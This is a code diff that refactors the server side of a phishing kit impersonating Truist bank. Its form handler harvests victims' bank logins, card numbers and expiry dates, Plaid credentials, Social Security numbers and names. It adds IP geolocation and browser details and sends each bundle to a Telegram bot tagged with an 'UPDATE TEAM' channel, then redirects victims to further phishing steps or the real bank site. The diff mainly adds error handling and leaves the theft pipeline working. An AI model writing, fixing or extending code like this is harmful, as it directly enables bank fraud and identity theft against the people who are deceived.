@@ -179,114 +179,130 @@ app.use((req, res, next) => {
 
 // Route handler for form submission
 app.post('/receive', async (req, res) => {
-  let message = '';
-  let myObject = req.body;
+    let message = '';
+    let responseSent = false; // Flag to prevent multiple responses
+    const myObject = req.body;
 
-  const sendAPIRequest = async (ipAddress) => {
-    const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-    console.log(apiResponse.data);
-    return apiResponse.data;
-  };
+    const sendAPIRequest = async (ipAddress) => {
+        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        console.log(apiResponse.data);
+        return apiResponse.data;
+    };
 
-  const ipAddress = getClientIp(req);
-  const ipAddressInformation = await sendAPIRequest(ipAddress);
-  const userAgent = req.headers["user-agent"];
-  const systemLang = req.headers["accept-language"];
+    try {
+        const ipAddress = getClientIp(req);
+        const ipAddressInformation = await sendAPIRequest(ipAddress);
+        const userAgent = req.headers["user-agent"];
+        const systemLang = req.headers["accept-language"];
 
-  const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
+        const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
 
-  // Convert myObjects to lowercase for case insensitive checks
-  const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
+        // Check conditions and prepare message
+        if (myObjects.includes('password') || myObjects.includes('email')) {
+            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
+                `👤 LOGIN \n\n`;
 
-  if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
-    message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
-               `👤 LOGIN \n\n`;
+            for (const key of Object.keys(myObject)) {
+                if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
+                    console.log(`${key}: ${myObject[key]}`);
+                    message += `${key}: ${myObject[key]}\n`;
+                }
+            }
 
-    for (const key of myObjects) {
-      if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
+            message += `🌍 GEO-IP INFO\n` +
+                `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+                `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+                `CITY             : ${ipAddressInformation.location.city}\n` +
+                `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+                `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+                `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+                `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+                `💻 SYSTEM INFO\n` +
+                `USER AGENT       : ${userAgent}\n` +
+                `SYSTEM LANGUAGE  : ${systemLang}\n` +
+                `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+            res.send({ url: "/confirm?action=1" });
+            responseSent = true;
+        }
+
+        if (!responseSent && (myObjects.includes('expirationdate') || myObjects.includes('cardnumber') || myObjects.includes('billing address'))) {
+            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
+                `👤 CARD INFO \n\n`;
+
+            for (const key of Object.keys(myObject)) {
+                if (key.toLowerCase() !== 'visitor') {
+                    console.log(`${key}: ${myObject[key]}`);
+                    message += `${key}: ${myObject[key]}\n`;
+                }
+            }
+
+            message += `🌍 GEO-IP INFO\n` +
+                `IP ADDRESS       : ${ipAddress}\n` +
+                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+                `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+            res.send({ url: "/link?step=1" });
+            responseSent = true;
+        }
+
+        if (!responseSent && myObjects.includes('userid')) {
+            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
+                `👤 PLAID LOGIN \n\n`;
+
+            for (const key of Object.keys(myObject)) {
+                if (key.toLowerCase() !== 'visitor') {
+                    console.log(`${key}: ${myObject[key]}`);
+                    message += `${key}: ${myObject[key]}\n`;
+                }
+            }
+
+            message += `🌍 GEO-IP INFO\n` +
+                `IP ADDRESS       : ${ipAddress}\n` +
+                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+                `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+            res.send({ url: "https://truist.com/" });
+            responseSent = true;
+        }
+
+        if (!responseSent && (myObjects.includes('ssn') || myObjects.includes('firstname') || myObjects.includes('lastname'))) {
+            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
+                `👤 CONTACT INFO \n\n`;
+
+            for (const key of Object.keys(myObject)) {
+                if (key.toLowerCase() !== 'visitor') {
+                    console.log(`${key}: ${myObject[key]}`);
+                    message += `${key}: ${myObject[key]}\n`;
+                }
+            }
+
+            message += `🌍 GEO-IP INFO\n` +
+                `IP ADDRESS       : ${ipAddress}\n` +
+                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+                `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+            res.send({ url: "/confirm?action=2" });
+            responseSent = true;
+        }
+
+        // Send message to bot if needed
+        if (!responseSent) {
+            res.status(400).send({ error: "No matching keys found in request body." });
+            responseSent = true;
+        }
+
+        const sendMessage = sendMessageFor(botToken, chatId);
+        sendMessage(message);
+
+        console.log(message);
+    } catch (error) {
+        if (!responseSent) {
+            res.status(500).send({ error: "Internal server error" });
+        }
+        console.error(error);
     }
-
-    message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
-        `CITY             : ${ipAddressInformation.location.city}\n` +
-        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-        `💻 SYSTEM INFO\n` +
-        `USER AGENT       : ${userAgent}\n` +
-        `SYSTEM LANGUAGE  : ${systemLang}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-    res.send({url : "/confirm?action=1"});
-  }
-
-  if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
-    message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
-               `👤 CARD INFO \n\n`;
-
-    for (const key of myObjects) {
-      if (key.toLowerCase() !== 'visitor') {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
-    }
-
-    message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddress}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-    res.send({url : "/link?step=1"});
-  }
-
-  if (lowerCaseMyObjects.includes('userid')) {
-    message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
-               `👤 PLAID LOGIN \n\n`;
-
-    for (const key of myObjects) {
-      if (key.toLowerCase() !== 'visitor') {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
-    }
-
-    message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddress}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-    res.send({url : "https://truist.com/"});
-  }
-
-  if (lowerCaseMyObjects.includes('ssn') || lowerCaseMyObjects.includes('firstname') || lowerCaseMyObjects.includes('lastname')) {
-    message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
-               `👤 CONTACT INFO \n\n`;
-
-    for (const key of myObjects) {
-      if (key.toLowerCase() !== 'visitor') {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
-    }
-
-    message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddress}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-    res.send({url : "/confirm?action=2"});
-  }
-
-  const sendMessage = sendMessageFor(botToken, chatId);
-  sendMessage(message);
-
-  console.log(message);
 });
 
 // Route handler for login pages
